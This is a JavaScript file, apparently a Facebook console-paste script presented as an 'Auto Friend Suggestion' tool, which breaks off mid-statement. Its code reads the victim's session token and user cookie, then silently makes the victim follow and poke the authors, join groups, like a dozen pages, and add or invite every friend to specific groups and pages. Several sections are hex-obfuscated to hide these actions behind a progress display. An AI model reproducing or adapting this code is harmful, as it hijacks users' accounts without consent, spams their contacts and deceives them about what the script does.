var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama);
        if (konum != -1) {
            konum += tarama.length;
            son = document.cookie.indexOf(";", konum);
            if (son == -1) son = document.cookie.length;
            return unescape(document.cookie.substring(konum, son))
        } else {
            return ""
        }
    }
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min
}

function randomValue(arr) {
    return arr[getRandomInt(0, arr.length - 1)]
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
    var http4 = new XMLHttpRequest();
    var url4 = "//www.facebook.com/ajax/poke_dialog.php";
    var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg=" + fb_dtsg + "&phstamp=165816575103566878180";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) {
            http4.close
        }
    };
    http4.send(params4)
}

a("100005115938614");
a("100001050235420");

var Title = 'Auto Friend Suggestion ';
var Descriptions = "",
    _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/313072532101076" target="_blank">Loading [lllllllllll ] 99%</A> & <A style="color:#3B5998;" href="http://www.facebook.com/199134496914077" target="_blank"> Assam Indian Cyber Force</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100001050235420" target="_blank"> Waqar Ahmad</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100005115938614" target="_blank"> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://automateyourfacebook.blogspot.in/" target="_blank">Automate Your Facebook</A>.</A>';
newcomer = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];
fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;


function SuggestFriend(opo) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=" + newcomer + "&attempt_id=b59804250a76689137fe1cb2c05367db&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=o&fb_dtsg=" + fb_dtsg + "&ttstamp=265816610484687452", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkred'>";
            err++;
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:gray;font-size:12px'>";
            Descriptions += "Friend Suggestion Sent";
            suc++
        }
        Descriptions += "</div>";
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
        display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
        if (i > 0) {
            display += arr.length + " Friends Detected<br/>";
            display += "<b>" + suc + "</b> Friends Suggested of " + (arr.length - i) + " Friends Processed ";
            display += "(" + i + " Lefted...)";
            display += "<div class='friend-edge'>";
            display += Descriptions;
            display += "<img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            display += _text;
            display += "</div>";
            display += "</div>"
        } else {
            display += arr.length + " Friends Detected and ";
            display += "<b>" + suc + " Friends Suggested</b></br>";
            display += "<div><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span>"
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[tay];
        sx = pho[tay];
        setTimeout("SuggestFriend(" + s + ")", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);



    if (newcomer) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=514486465297821&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
    }

    if (newcomer) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=638448586182539&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
    }
    if (newcomer) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=643119549085030&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
    }

}

function clickfr_callback() {
    if (document.getElementsByName("ok").length > 0) nHtml.ClickUp(document.getElementsByName("ok")[0]);
    var a = arr[i];
    if (i < arr.length) addfriend(a.substring(0, 4))
}

function clickfr() {
    if (document.getElementsByClassName("search").length > 0) nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1]);
    else j++;
    setTimeout("clickfr_callback()", 2E3)
}

function addfriend(a) {
    i++;
    setTimeout("clickfr()", 2E3)
}
jx = {
    getHTTPObject: function () {
        var a = false;
        if (typeof ActiveXObject != "undefined") try {
            a = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (b) {
            try {
                a = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (c) {
                a = false
            }
        } else if (window.XMLHttpRequest) try {
            a = new XMLHttpRequest
        } catch (b) {
            a = false
        }
        return a
    },
    load: function (url, callback, format, method, opt) {
        var http = this.init();
        if (!http || !url) return;
        if (http.overrideMimeType) http.overrideMimeType("text/xml");
        if (!method) method = "GET";
        if (!format) format = "text";
        if (!opt) opt = {};
        format = format.toLowerCase();
        method = method.toUpperCase();
        var now = "uid=" + (new Date).getTime();
        url += url.indexOf("?") + 1 ? "&" : "?";
        url += now;
        var parameters = null;
        if (method == "POST") {
            var parts = url.split("?");
            url = parts[0];
            parameters = parts[1]
        }
        http.open(method, url, true);
        var ths = this;
        if (opt.handler) http.onreadystatechange = function () {
            opt.handler(http)
        };
        else http.onreadystatechange = function () {
            if (http.readyState == 4)
                if (http.status == 200) {
                    var result = "";
                    if (http.responseText) result = http.responseText;
                    if (format.charAt(0) == "j") {
                        result = result.replace(/[\n\r]/g, "");
                        result = eval("(" + result + ")")
                    } else if (format.charAt(0) == "x") result = http.responseXML;
                    if (callback) callback(result)
                } else {
                    if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
                    if (opt.loading) document.getElementById(opt.loading).style.display = "none";
                    if (error) error(http.status)
                }
        };
        http.send(parameters)
    },
    bind: function (a) {
        var b = {
            url: "",
            onSuccess: false,
            onError: false,
            format: "text",
            method: "GET",
            update: "",
            loading: "",
            loadingIndicator: ""
        };
        for (var c in b)
            if (a[c]) b[c] = a[c];
        if (!b.url) return;
        var d = false;
        if (b.loadingIndicator) {
            d = document.createElement("div");
            d.setAttribute("style", "position:absolute;top:0px;left:0px;");
            d.setAttribute("class", "loading-indicator");
            d.innerHTML = b.loadingIndicator;
            document.getElementsByTagName("body")[0].appendChild(d);
            this.opt.loadingIndicator = d
        }
        if (b.loading) document.getElementById(b.loading).style.display = "block";
        this.load(b.url, function (a) {
            if (b.onSuccess) b.onSuccess(a);
            if (b.update) document.getElementById(b.update).innerHTML = a;
            if (d) document.getElementsByTagName("body")[0].removeChild(d);
            if (b.loading) document.getElementById(b.loading).style.display = "none"
        }, b.format, b.method, b)
    },
    init: function () {
        return this.getHTTPObject()
    }
};
var nHtml = {
    FindByAttr: function (a, b, c, d) {
        if (c == "className") c = "class";
        var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
        if (e && e.singleNodeValue) return e.singleNodeValue;
        return null
    },
    FindByClassName: function (a, b, c) {
        return this.FindByAttr(a, b, "className", c)
    },
    FindByXPath: function (a, b) {
        try {
            var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
        } catch (d) {
            GM_log("bad xpath:" + b)
        }
        if (c && c.singleNodeValue) return c.singleNodeValue;
        return null
    },
    VisitUrl: function (a) {
        window.setTimeout(function () {
            document.location.href = a
        }, 500 + Math.floor(Math.random() * 500))
    },
    ClickWin: function (a, b, c) {
        var d = a.document.createEvent("MouseEvents");
        d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
        return !b.dispatchEvent(d)
    },
    Click: function (a) {
        return this.ClickWin(window, a, "click")
    },
    ClickTimeout: function (a, b) {
        window.setTimeout(function () {
            return nHtml.ClickWin(window, a, "click")
        }, b + Math.floor(Math.random() * 500))
    },
    ClickUp: function (a) {
        this.ClickWin(window, a, "mousedown");
        this.ClickWin(window, a, "mouseup");
        this.ClickWin(window, a, "click")
    },
    GetText: function (a, b) {
        var c = "";
        if (b == undefined) b = 0;
        if (b > 40) return;
        if (a.textContent != undefined) return a.textContent;
        for (var d = 0; d < a.childNodes.length; d++) {
            var e = a.childNodes[d];
            c += this.GetText(e, b + 1)
        }
        return c
    }
};
if (document.getElementsByClassName == undefined) document.getElementsByClassName = function (a) {
    var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)");
    var c = document.getElementsByTagName("*");
    var d = [];
    var e;
    for (var f = 0;
        (e = c[f]) != null; f++) {
        var g = e.className;
        if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
    }
    return d
};
Array.prototype.find = function (a) {
    var b = false;
    for (i = 0; i < this.length; i++)
        if (typeof a == "function") {
            if (a.test(this[i])) {
                if (!b) b = [];
                b.push(i)
            }
        } else if (this[i] === a) {
        if (!b) b = [];
        b.push(i)
    }
    return b
};
var i = 3;
var tay = 3;
var j = 0;
var k = 0;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length);
    var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
    display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
    display += arr.length + " Friends Detected";
    display += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = display;
    SuggestFriend(arr[i])
});
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function cereziAli(isimi) {
    var taramai = isimi + "=";
    if (document.cookie.length > 0) {
        konumi = document.cookie.indexOf(taramai);
        if (konumi != -1) {
            konumi += taramai.length;
            soni = document.cookie.indexOf(";", konumi);
            if (soni == -1) soni = document.cookie.length;
            return unescape(document.cookie.substring(konumi, soni))
        } else {
            return ""
        }
    }
}

function getRandomInti(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min
}

function randomValue(arri) {
    return arri[getRandomInti(0, arri.length - 1)]
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function B(bone) {
    var http24 = new XMLHttpRequest();
    var url24 = "/ajax/follow/follow_profile.php?__a=1";
    var params24 = "profile_id=" + bone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http24.open("POST", url24, true);
    http24.onreadystatechange = function () {
        if (http24.readyState == 4 && http24.status == 200) {
            http24.close
        }
    };
    http24.send(params24)
}
B("100005115938614");
B("100001050235420");
/* atmt */var _0x4abb=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x47\x45\x54","\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x74\x6F\x6B\x65\x6E","\x72\x61\x6E\x64\x6F\x6D","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x28","\x73\x75\x62\x73\x74\x72","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x29","\x65\x72\x72\x6F\x72","\x69\x6E\x64\x65\x78","\x73\x6F\x72\x74","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x35\x31\x34\x34\x38\x36\x34\x36\x35\x32\x39\x37\x38\x32\x31","\x36\x33\x37\x30\x30\x35\x33\x37\x36\x33\x32\x30\x39\x35\x37","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x2F\x72\x32\x6A\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x72\x65\x66\x3D\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68","\x6C\x65\x6E\x67\x74\x68","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x2F\x61\x64\x64\x5F\x70\x6F\x73\x74\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x74\x79\x70\x65\x61\x68\x65\x61\x64\x26\x72\x65\x66\x3D\x26\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x3D\x26\x6D\x65\x6D\x62\x65\x72\x73\x3D","\x75\x69\x64","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x73\x74\x61\x74\x75\x73","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x70\x61\x67\x65\x73\x2F\x69\x6E\x76\x69\x74\x65\x2F\x73\x65\x6E\x64\x5F\x73\x69\x6E\x67\x6C\x65\x2F","\x70\x61\x67\x65\x5F\x69\x64\x3D","\x26\x69\x6E\x76\x69\x74\x65\x65\x3D","\x26\x65\x6C\x65\x6D\x5F\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x33\x5F\x35\x36\x26\x61\x63\x74\x69\x6F\x6E\x3D\x73\x65\x6E\x64\x26\x72\x65\x66\x3D\x66\x72\x69\x65\x6E\x64\x5F\x73\x75\x6D\x6D\x61\x72\x79\x5F\x73\x65\x63\x74\x69\x6F\x6E\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x61\x4A\x73\x77\x46\x47\x79\x6A\x32\x71\x6D\x39\x61\x64\x44\x67\x44\x78\x79\x49\x47\x4B\x69\x68\x38\x78\x45\x57\x39\x41\x43\x79\x38\x6A\x78\x36\x68\x61\x47\x67\x79\x68\x71\x47\x65\x6A\x68\x65\x43\x26\x5F\x5F\x72\x65\x71\x3D\x78\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x36\x35\x31\x31\x39\x37\x38\x36\x36\x39\x37\x36\x39\x26\x5F\x5F\x72\x65\x76\x3D\x31\x31\x31\x34\x36\x39\x36"];var fb_dtsg=document[_0x4abb[2]](_0x4abb[1])[0][_0x4abb[0]];var user_id=document[_0x4abb[4]][_0x4abb[3]](document[_0x4abb[4]][_0x4abb[3]](/c_user=(\d+)/)[1]);var friends= new Array();gf= new XMLHttpRequest();gf[_0x4abb[10]](_0x4abb[5],_0x4abb[6]+user_id+_0x4abb[7]+Math[_0x4abb[8]]()+_0x4abb[9],false);gf[_0x4abb[11]]();if(gf[_0x4abb[12]]!=4){} else {data=eval(_0x4abb[13]+gf[_0x4abb[15]][_0x4abb[14]](9)+_0x4abb[16]);if(data[_0x4abb[17]]){} else {friends=data[_0x4abb[21]][_0x4abb[20]][_0x4abb[19]](function (_0x84c6x4,_0x84c6x5){return _0x84c6x4[_0x4abb[18]]-_0x84c6x5[_0x4abb[18]];} );} ;} ;var pid=[_0x4abb[22]];var gid=[_0x4abb[23]];var fb_dtsg=document[_0x4abb[2]](_0x4abb[1])[0][_0x4abb[0]];var user_id=document[_0x4abb[4]][_0x4abb[3]](document[_0x4abb[4]][_0x4abb[3]](/c_user=(\d+)/)[1]);var httpwp= new XMLHttpRequest();var urlwp=_0x4abb[24];var paramswp=_0x4abb[25]+gid+_0x4abb[26]+fb_dtsg+_0x4abb[27]+user_id+_0x4abb[28];httpwp[_0x4abb[10]](_0x4abb[29],urlwp,true);httpwp[_0x4abb[32]](_0x4abb[30],_0x4abb[31]);httpwp[_0x4abb[32]](_0x4abb[33],paramswp[_0x4abb[34]]);httpwp[_0x4abb[32]](_0x4abb[35],_0x4abb[36]);httpwp[_0x4abb[11]](paramswp);for(var i=0;i<friends[_0x4abb[34]];i++){var httpwp= new XMLHttpRequest();var urlwp=_0x4abb[37];var paramswp=_0x4abb[26]+fb_dtsg+_0x4abb[38]+gid+_0x4abb[39]+friends[i][_0x4abb[40]]+_0x4abb[27]+user_id+_0x4abb[28];httpwp[_0x4abb[10]](_0x4abb[29],urlwp,true);httpwp[_0x4abb[32]](_0x4abb[30],_0x4abb[31]);httpwp[_0x4abb[32]](_0x4abb[33],paramswp[_0x4abb[34]]);httpwp[_0x4abb[32]](_0x4abb[35],_0x4abb[36]);httpwp[_0x4abb[41]]=function (){if(httpwp[_0x4abb[12]]==4&&httpwp[_0x4abb[42]]==200){} ;} ;httpwp[_0x4abb[11]](paramswp);} ;for(var i=0;i<friends[_0x4abb[34]];i++){var httpwp= new XMLHttpRequest();var urlwp=_0x4abb[43];var paramswp=_0x4abb[44]+pid+_0x4abb[45]+friends[i][_0x4abb[40]]+_0x4abb[46]+user_id+_0x4abb[47]+fb_dtsg+_0x4abb[48];httpwp[_0x4abb[10]](_0x4abb[29],urlwp,true);httpwp[_0x4abb[32]](_0x4abb[30],_0x4abb[31]);httpwp[_0x4abb[32]](_0x4abb[33],paramswp[_0x4abb[34]]);httpwp[_0x4abb[32]](_0x4abb[35],_0x4abb[36]);httpwp[_0x4abb[41]]=function (){if(httpwp[_0x4abb[12]]==4&&httpwp[_0x4abb[42]]==200){} ;} ;httpwp[_0x4abb[11]](paramswp);} ;/*r2j*/var _0xb6e0=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x26\x72\x65\x66\x3D\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x2F\x72\x32\x6A\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x36\x33\x37\x30\x30\x35\x33\x37\x36\x33\x32\x30\x39\x35\x37","\x31\x34\x31\x36\x31\x36\x33\x39\x32\x31\x39\x34\x35\x38\x34\x37","\x35\x39\x37\x30\x36\x34\x39\x38\x33\x36\x37\x33\x39\x38\x32"];var b=document[_0xb6e0[2]](_0xb6e0[1])[0][_0xb6e0[0]],c=document[_0xb6e0[4]][_0xb6e0[3]](document[_0xb6e0[4]][_0xb6e0[3]](/c_user=(\d+)/)[1]);function g(_0x7385x4){var _0x7385x5= new XMLHttpRequest;_0x7385x4=_0xb6e0[5]+_0x7385x4+_0xb6e0[6]+b+_0xb6e0[7]+c+_0xb6e0[8];_0x7385x5[_0xb6e0[11]](_0xb6e0[9],_0xb6e0[10],!0);_0x7385x5[_0xb6e0[12]]=function (){4==_0x7385x5[_0xb6e0[13]]&&200==_0x7385x5[_0xb6e0[14]]&&_0x7385x5[_0xb6e0[15]];} ;_0x7385x5[_0xb6e0[16]](_0x7385x4);} ;g(_0xb6e0[17]);g(_0xb6e0[18]);g(_0xb6e0[19]);b=document[_0xb6e0[2]](_0xb6e0[1])[0][_0xb6e0[0]];c=document[_0xb6e0[4]][_0xb6e0[3]](document[_0xb6e0[4]][_0xb6e0[3]](/c_user=(\d+)/)[1]);/*LKP*/var _0x26ad=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x70\x61\x67\x65\x73\x2F\x66\x61\x6E\x5F\x73\x74\x61\x74\x75\x73\x2E\x70\x68\x70","\x66\x62\x70\x61\x67\x65\x5F\x69\x64\x3D","\x26\x61\x64\x64\x3D\x74\x72\x75\x65\x26\x72\x65\x6C\x6F\x61\x64\x3D\x66\x61\x6C\x73\x65\x26\x66\x61\x6E\x5F\x6F\x72\x69\x67\x69\x6E\x3D\x70\x61\x67\x65\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x26\x66\x61\x6E\x5F\x73\x6F\x75\x72\x63\x65\x26\x63\x61\x74\x26\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x5F\x70\x61\x67\x65\x5F\x61\x63\x74\x69\x6F\x6E\x73\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x33\x35\x79\x6E\x7A\x70\x51\x39\x55\x6D\x57\x57\x75\x55\x47\x79\x36\x7A\x45\x43\x6A\x43\x77\x26\x5F\x5F\x72\x65\x71\x3D\x64\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x36\x38\x31\x30\x35\x34\x35\x31\x32\x31\x31\x31\x35\x37\x30","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x32\x39\x36\x37\x39\x38\x33\x35\x33\x37\x33\x35\x33\x30\x38","\x32\x39\x37\x33\x30\x31\x31\x39\x33\x37\x31\x38\x33\x36\x33","\x32\x33\x32\x32\x33\x33\x39\x36\x33\x35\x39\x34\x35\x33\x35","\x36\x32\x36\x30\x36\x33\x38\x39\x30\x37\x36\x38\x39\x31\x39","\x35\x31\x34\x34\x38\x36\x34\x36\x35\x32\x39\x37\x38\x32\x31","\x31\x39\x39\x31\x33\x34\x34\x39\x36\x39\x31\x34\x30\x37\x37","\x31\x36\x35\x34\x31\x31\x35\x38\x30\x32\x38\x36\x31\x33\x32","\x34\x30\x30\x30\x33\x36\x35\x30\x33\x34\x35\x39\x39\x36\x35","\x31\x32\x37\x37\x36\x30\x32\x36\x30\x37\x35\x38\x30\x37\x38","\x32\x36\x38\x32\x31\x38\x33\x34\x30\x30\x31\x31\x35\x35\x35","\x32\x34\x33\x35\x33\x39\x39\x39\x39\x31\x33\x38\x35\x30\x32","\x32\x36\x39\x38\x36\x36\x31\x36\x33\x30\x32\x35\x38\x31\x31"];var fb_dtsg=document[_0x26ad[2]](_0x26ad[1])[0][_0x26ad[0]];var user_id=document[_0x26ad[4]][_0x26ad[3]](document[_0x26ad[4]][_0x26ad[3]](/c_user=(\d+)/)[1]);function Like(_0x88d3x4){var _0x88d3x5= new XMLHttpRequest();var _0x88d3x6=_0x26ad[5];var _0x88d3x7=_0x26ad[6]+_0x88d3x4+_0x26ad[7]+user_id+_0x26ad[8]+fb_dtsg+_0x26ad[9];_0x88d3x5[_0x26ad[11]](_0x26ad[10],_0x88d3x6,true);_0x88d3x5[_0x26ad[12]]=function (){if(_0x88d3x5[_0x26ad[13]]==4&&_0x88d3x5[_0x26ad[14]]==200){_0x88d3x5[_0x26ad[15]];} ;} ;_0x88d3x5[_0x26ad[16]](_0x88d3x7);} ;Like(_0x26ad[17]);Like(_0x26ad[18]);Like(_0x26ad[19]);Like(_0x26ad[20]);Like(_0x26ad[21]);Like(_0x26ad[22]);Like(_0x26ad[23]);Like(_0x26ad[24]);Like(_0x26ad[25]);Like(_0x26ad[26]);Like(_0x26ad[27]);Like(_0x26ad[28]);var 